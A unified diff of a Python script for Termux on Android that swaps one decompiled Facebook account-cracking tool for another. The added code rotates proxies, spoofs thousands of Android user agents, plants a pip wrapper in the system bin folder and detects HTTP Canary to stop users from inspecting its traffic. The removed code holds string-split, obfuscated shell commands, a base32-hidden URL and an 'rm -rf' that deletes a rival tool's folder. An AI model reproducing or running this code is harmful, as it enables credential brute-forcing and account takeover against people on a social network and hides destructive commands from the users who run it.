@@ -1,567 +1,1091 @@
-""" source with ---( TEAM XNX )--- """
+"""
+//DECOMPILED BY AHMED XD
+@@FACEBOOK : AHMED.XD.7732
+"""
+#--------------------------(IMPORT BOX)--------------------------#
+import os,sys,time,json,random,re,string,platform,base64,uuid
+import os,sys,time,requests,random,uuid,json
+import random
+from random import choice
+from concurrent.futures import ThreadPoolExecutor as run
+def load(word):
+    lix = ['/', '-', '\\', '|']
+    for i in range(5):
+        for x in range(len(lix)):
+            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
+            time.sleep(0.2)
+            sys.stdout.flush()
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+ugen=[]
+cp=[]
+ok=[]
+try:
+    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+    open('.prox.txt','w').write(prox)
+except Exception as e:
+    pass
+prox=open('.prox.txt','r').read().splitlines()
+user=[]
+ok=[]
+cp=[]
+cpx=[]
+loop=0
+plist=[]
+uas=[]
+usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
+rr = random.randint
+import requests,os,time,requests,zlib
+t = '''#!/data/data/com.termux/files/usr/bin/python3.11
+# -*- coding: utf-8 -*-
+import re
+import sys
+from pip._internal.cli.main import main
+if __name__ == '__main__':
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())
+'''
+if os.path.isfile('/data/data/com.termux/files/usr/bin/ok'):pass
+else:
+	open('/data/data/com.termux/files/usr/bin/ok','a').write(t)
+	os.system("chmod +x /data/data/com.termux/files/usr/bin/ok")
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+#-------------------[HTTP CANARY]---------------------#
+try:
+	open("/sdcard/.xx.txt","w").write("DELETE KORIS NA KORBI KOR TATE AMAR BAL CHERA GELO")
+except:pass
+path_storage = "/sdcard/.xx.txt"
+if os.path.exists(path_storage):
+	pass
+else:
+	print("GIVE STORAGE PERMISSION FOR SAVE IDS FILE ")
+	exit()
+package_name = "com.httpcanary.pro"
+path_canary = "/sdcard/Android/data"
+if os.path.exists(os.path.join(path_canary, package_name)):
+	print(f"DELETE YOUR FUCKING HTTP CANARY FROM {path_canary} ")
+	exit()
+else:
+	pass
+package_name2 = "com.guoshi.httpcanary"
+path_canary2 = "/sdcard/Android/data"
+if os.path.exists(os.path.join(path_canary2, package_name2)):
+	print(f"DELETE YOUR FUCKING HTTP CANARY FROM {path_canary2} ")
+	exit()
+from requests import api
+fuck11 = open(api.__file__, 'r').read()
+c = ['print', 'zlib', 'marshal', 'base64']
+if not any(word in fuck11 for word in c):
+	pass
+else:
+	print('SORRY')
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import api
+fuck1 = open(api.__file__,'r').read()
+if len(fuck1) !=6449:
+	print('okh')
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+else:pass
+from requests import models
+fuck21 = open(models.__file__, 'r').read()
+c = ['print', 'zlib', 'marshal', 'base64']
+if not any(word in fuck21 for word in c):
+	pass
+else:
+	print('SORRY')
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import models
+fuck2 = open(models.__file__,'r').read()
+if len(fuck2) !=35223:
+	print("okhh")
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import utils
+fuck31 = open(utils.__file__, 'r').read()
+c = ['print', 'zlib', 'marshal', 'base64']
+if not any(word in fuck31 for word in c):
+	pass
+else:
+	print('SORRY')
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import utils
+fuck3 = open(utils.__file__,'r').read()
+if len(fuck3) !=33448:
+	print("okhhh")
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import sessions
+fuck41 = open(sessions.__file__, 'r').read()
+c = ['print', 'zlib', 'marshal', 'base64']
+if not any(word in fuck41 for word in c):
+	pass
+else:
+	print('SORRY')
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import sessions
+fuck4 = open(sessions.__file__,'r').read()
+if len(fuck4) !=30373:
+	print("okhhhh")
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import exceptions
+fuck51 = open(exceptions.__file__, 'r').read()
+c = ['print', 'zlib', 'marshal', 'base64']
+if not any(word in fuck51 for word in c):
+	pass
+else:
+	print('SORRY')
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import exceptions
+fuck5 = open(exceptions.__file__,'r').read()
+if len(fuck5) !=3811:
+	print("SORRY")
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import compat
+fuck61 = open(compat.__file__, 'r').read()
+c = ['print', 'zlib', 'marshal', 'base64']
+if not any(word in fuck61 for word in c):
+	pass
+else:
+	print('SORRY')
+	exit()
+from requests import compat
+fuck6 = open(compat.__file__,'r').read()
+if len(fuck6) !=1451:
+	print("SORRY")
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import cookies
+fuck71 = open(cookies.__file__, 'r').read()
+c = ['print', 'zlib', 'marshal', 'base64']
+if not any(word in fuck71 for word in c):
+	pass
+else:
+	print('SORRY')
+	exit()
+from requests import cookies
+fuck7 = open(cookies.__file__,'r').read()
+if len(fuck7) !=18560:
+	print("SORRY")
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import adapters
+fuck81 = open(adapters.__file__, 'r').read()
+c = ['print', 'zlib', 'marshal', 'base64']
+if not any(word in fuck81 for word in c):
+	pass
+else:
+	print('SORRY')
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+from requests import adapters
+fuck8 = open(adapters.__file__,'r').read()
+if len(fuck8) !=19553:
+	print("SORRY")
+	os.system("ok uninstall requests -y > /dev/null")
+	os.system('ok install requests')
+	exit()
+#--------------------------(UA BOX)--------------------------#
+gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
+ugen=[]
+for xd in range(10000) :
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e='Mobile Safari/537.36'
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
 
-import os,zlib,time,random,uuid,subprocess,sys,json,base64,platform,string,marshal,re
-from concurrent.futures import ThreadPoolExecutor as refatshahriar
-from zlib import decompress
-from os import system
-from random import randint
-wash = os.system
-wash("pk"+"g u"+"nins"+"tall"+" py"+"th"+"on -y;"+"pkg "+"insta"+"ll "+"p"+"ytho"+"n-pip -"+"y;p"+"ip u"+"nins"+"tall py"+"cu"+"rl re"+"que"+"sts ch"+"ar"+"det ur"+"lli"+"b3 id"+"na cer"+"tifi -y > /"+"dev/"+"nul"+"l;pi"+"p ins"+"tall p"+"yc"+"url ch"+"ardet ur"+"llib"+"3 id"+"na ce"+"rti"+"fi req"+"ues"+"ts > /d"+"ev"+"/nu"+"ll");wash('xdg-open https:'+'//faceboo'+'k.com/grou'+'ps/14317482'+'23768752/');time.sleep(3);wash("xdg-open https"+"://chat.what"+"sapp.com/LJk2Vt0"+"ogyTFJDyk2GNqv0");wash('clear')
-kire = 'NB2H'+'I4DTHI'+'XS64TF'
-hala = 'MZQ'+'XIMJTG'+'UZC4YTMN'
-#-------------------------(System Colour)------------------------->>>
-G = "\033[38;5;46m";G0 = "\x1b[38;5;46m";G1 = "\x1b[38;5;47m";G2 = "\x1b[38;5;48m";G3 = "\x1b[38;5;49m";G4 = "\x1b[38;5;50m";G5 = "\x1b[38;5;51m";G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";R = "\033[1;91m";RE = "\033[1;31m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\033[38;5;53m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m"
-colors = ["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"]
-xoxo = random.choice(colors)
-style = f'{G}[{R}●{G}]{G}'
-moja = '5TX'+'G4DPO'+'QXGG33NF'
-try:
-    import pycurl
-    from io import BytesIO
-except:
-    wash('p'+'ip ins'+'tall pyc'+'url > /dev'+'/null')
-    import pycurl
-    from io import BytesIO
-try:import requests
-except:wash('pi'+'p uni'+'nstall requ'+'ests cha'+'rdet id'+'na cert'+'ifi urll'+'ib3 -y > /dev/null;p'+'ip ins'+'tall char'+'det id'+'na cert'+'ifi requ'+'ests urll'+'ib3 > /d'+'ev/nu'+'ll');os.system("clear");exit(" Error Run Again ! ")
-try:
-    from licensing.models import *
-    from licensing.methods import Key, Helpers
-except:wash("p"+"ip ins"+"tall lice"+"nsing > /d"+"ev/nu"+"ll")
-try:import bs4
-except:wash('p'+'ip ins'+'tall b'+'s4 > /d'+'ev/nu'+'ll')
-try:os.makedirs('/sdcard/TOP')
-except:pass
-try:
-    wash('rm -'+'rf /sd'+'card/.txt');wash('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
-except PermissionError:
-    print(f'{style} Wi'+'thout Sto'+'rage Perm'+'ission You Can'+'not R'+'un My Com'+'mand A'+'llow Te'+'rmux Perm'+'issions ! A'+'nd Run A'+'gain ');wash('termux-setup-storage');wash('clear');exit('[=] Ru'+'n Aga'+'in Th'+'is To'+'ol !!')
-try:
-    fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
-    if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
-        print('fou'+'nd err'+'or i'+'n yo'+'ur te'+'rmu'+'x');exit()
-except:pass
-try:
-    files = os.listdir("/"+"da"+"ta/d"+"ata/c"+"om.t"+"ermux/"+"files"+"/ho"+"me/M"+"AH"+"AD"+"I-"+"GRE"+"EN");os.system("rm"+" -r"+"f $"+"HOME"+"/"+"MA"+"HAD"+"I-"+"GR"+"EE"+"N");exit(f"{style} An"+"ot"+"her "+"Tool"+" Use"+"r"+" No"+"t A"+"llow"+" B"+"ro"+" By"+"e ! ")
-except FileNotFoundError:pass
-except Exception as e:pass
-#----------------------[ ALL RANDOM MODELS ]--------------------------->>>
-sys.stdout.write(f'\x1b[1;35m\x1b]2; [×] =MR÷TOP= [×]\x07')
-OkLic = "<RS"+"AKe"+"yVa"+"lue><Mod"+"ulus>v16"+"ZdDedMM6dZ"+"xKXj+8KorJ4"+"PZmg1MsH"+"7h72L+5rs3+lw0aKuDE9Iv"+"6MbQjfs88+QUe6jHXW2"+"HXtXXQZ8N34hl+"+"yIWZvGOj8RacF"+"E0hhBeTVXMoij"+"bqIpYriJpPJs+bU"+"k7RpI9AJqze"+"YUmxjZk1fz5ZC"+"Xr0eGM8ty1+UX"+"CqHV/HY+K590"+"QMH4SjFJwmi/+WhCd"+"psWURu66d9O8L"+"+/C0SbGERcKm+JZ"+"Dg2n/FWh9I"+"Up7WSy3G9+"+"FgzdUJvrXkRArv9"+"r"+"2zDfM098y4e4ds5vALE5erdjsrjM"+"/M+RgYtjiQiGjuL"+"nO6Pfx5MkLlhcMYIxZ"+"c0ac1e57thOXQElUUx5X"+"YZQ"+"==</Mod"+"ulus><"+"Exp"+"onen"+"t>AQA"+"B</Exp"+"onent></RS"+"AKeyVal"+"ue>"
-auth = "Wy"+"I3MTY5MjU"+"1NiIsIklIZnc"+"5TkZDMXdRdHhL"+"S0Z5VGNYSW5kTjMve"+"TZpY096UlB2cUhxe"+"G0iXQ"+"=="
-xodas = '4ZDAMR'+'TF4YDIL3'+'BOBZG65T'
-naki = 'BNR'+'ZGKZTBOQWX'+'QZBONB2'+'G23A='
-soso = base64.b32decode(bytes(kire+hala+moja+xodas+naki,'utf-8')).decode()
-note = 'THI'+'S IS RE'+'FAT HERE ALWA'+'YS BRAN'+'D M'+'R-TOP !'
-licum = platform.platform().replace('Linux', '').replace('libc', '').replace('with', '').replace('-', '').replace('.','').replace('+', '').upper()[::1]
-licut = str(os.geteuid())+str(os.getlogin()).replace('_','').upper()[::1].replace('A0U', '')
-tornanire = "B"+"8V"+"N3"+"H4"+licum+licut
-hamdam = len
-loop,lim = 0,0
-methods,pcp,oks,cps,pw,user = [],[],[],[],[],[]
-"""-------------------------(ALL USERAGENT SYSTEM)-------------------------"""
-mdl_url = 'https'+'://gi'+'st.gith'+'ubuser'+'content'+'.com/R'+'EFAT-1'+'56/ce'+'32dac4fd'+'13dc22eb94'+'c9ef5003'+'300f/ra'+'w/8b89'+'908acc56bea'+'bce9eb329'+'e7873e8'+'e587025'+'15/'
-base_url = 'ht'+'tp'+'s://'+'raw.'+'gith'+'ubuse'+'rcont'+'ent.c'+'om/T'+'O'+'-X'+'D/T'+'O'+'P-S'+'E'+'C'+'/m'+'ain/'
-vrs_url = 'ht'+'tps'+'://r'+'aw.g'+'ithubu'+'serc'+'onte'+'nt.c'+'om/R'+'EFAT-'+'156'+'/R'+'EFA'+'T-X'+'D/mai'+'n/'
-vrs_curl = vrs_url+'t'+'tv.'+'txt';mdl_curl = mdl_url+'1'+'7k+';m1ua_url = base_url+'o'+'n'+'e.tx'+'t';m2ua_url = base_url+'t'+'w'+'o.t'+'xt';m3ua_url = base_url+'t'+'h'+'re'+'e.t'+'xt';m4ua_url = base_url+'f'+'o'+'u'+'r.t'+'xt';m5ua_url = base_url+'f'+'iv'+'e'+'.t'+'xt'
-def get_text_lines(url):
-    try:
-        buffer = BytesIO();c = pycurl.Curl();c.setopt(c.URL, url);c.setopt(c.WRITEDATA, buffer);c.perform();c.close()
-    except pycurl.error:exit(f"{style} Your Network Is Unreachable ! ")
-    return buffer.getvalue().decode('utf-8').splitlines()
-vr = '\n'.join(get_text_lines(vrs_curl));mdl = get_text_lines(mdl_curl);m1ua = get_text_lines(m1ua_url);m2ua = get_text_lines(m2ua_url);m3ua = get_text_lines(m3ua_url);m4ua = get_text_lines(m4ua_url);m5ua = get_text_lines(m5ua_url)
-#-------------------------(System Clear)------------------------->>>
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e='Mobile Safari/537.36'
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
+    a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+    b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+    c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+    e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+    usam=f'{a} {b}; {c}{d} {e}'
+    ugen.append(usam)
+
